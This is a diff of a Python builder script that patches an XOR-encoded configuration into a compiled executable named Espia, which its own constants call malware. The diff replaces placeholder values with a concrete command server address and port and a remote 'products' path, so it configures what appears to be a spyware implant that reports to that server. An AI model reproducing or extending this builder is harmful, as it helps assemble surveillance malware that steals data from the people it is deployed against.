@@ -1,18 +1,24 @@
 import json
 import random
 import shutil
+from pathlib import Path
+from itertools import cycle
 
-from pathlib3x import Path
 
 _MALWARE_CONFIG_BUFFER = 1000
-_COMPILED_MALWARE_PATH = '/Espia/x64/Release/Espia.exe'
+_COMPILED_MALWARE_PATH = 'C:\\Users\\Pako\\Documents\\GitHub\\Espia\\Espia\\x64\\Debug\\Espia.exe'
 _PATCHED_FILES_PATH = 'patched_files'
 _BEGIN_OF_CONFIG_SUFFIX = '{"Domain":'
 _PATCHED_FILE_NAME = f'Espia_patch{random.randint(1000, 99999)}.exe'
 _XOR_KEY = "Q"
+# _CONFIG = {
+#     "Domain": "<Server hostname\domain for products>",
+#     "ProductsPath": "<Remote products directory>"
+# }
 _CONFIG = {
-    "Domain": "<Server hostname\domain for products>",
-    "ProductsPath": "<Remote products directory>"
+    "Domain": "192.168.1.139",
+    "Port": "443",
+    "ProductsPath": "a"
 }
 
 
